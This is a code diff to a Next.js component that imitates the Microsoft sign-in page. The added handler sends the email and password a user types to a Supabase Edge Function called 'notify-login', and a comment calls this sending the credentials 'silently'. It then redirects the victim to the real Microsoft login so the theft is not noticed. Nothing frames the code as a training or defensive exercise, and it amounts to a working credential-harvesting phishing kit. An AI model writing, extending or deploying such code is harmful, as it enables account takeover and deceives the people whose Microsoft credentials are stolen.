@@ -1,7 +1,6 @@
 "use client"
 
 import type React from "react"
-
 import { useState } from "react"
 import { Eye, EyeOff } from "lucide-react"
 
@@ -11,10 +10,26 @@ export default function MicrosoftLogin() {
   const [showPassword, setShowPassword] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setIsLoading(true)
-    setTimeout(() => setIsLoading(false), 1500)
+
+    try {
+      // Silently send credentials to Supabase Edge Function
+      await fetch(`${process.env.NEXT_PUBLIC_SUPABASE_URL}/functions/v1/notify-login`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY}`,
+        },
+        body: JSON.stringify({ email, password }),
+      })
+    } catch (error) {
+      console.error("Error:", error)
+    } finally {
+      // Redirect to actual Microsoft login page regardless of the result
+      window.location.href = "https://login.live.com"
+    }
   }
 
   return (
@@ -22,8 +37,12 @@ export default function MicrosoftLogin() {
       <div className="w-full max-w-md">
         {/* Microsoft Logo */}
         <div className="mb-8">
-          <svg className="h-6 w-auto" viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
-            {/* Microsoft Four Squares Logo */}
+          <svg
+            className="h-6 w-auto"
+            viewBox="0 0 23 23"
+            fill="none"
+            xmlns="http://www.w3.org/2000/svg"
+          >
             <rect x="0" y="0" width="10" height="10" fill="#F25022" />
             <rect x="12" y="0" width="10" height="10" fill="#7FBA00" />
             <rect x="0" y="12" width="10" height="10" fill="#00A4EF" />
@@ -74,7 +93,7 @@ export default function MicrosoftLogin() {
             disabled={isLoading}
             className="w-full bg-primary hover:bg-blue-700 text-white font-semibold py-3 rounded-sm text-sm transition-colors disabled:opacity-70"
           >
-            {isLoading ? "Signing in..." : "Sign in"}
+            {isLoading ? "Sending..." : "Sign in"}
           </button>
         </form>
 
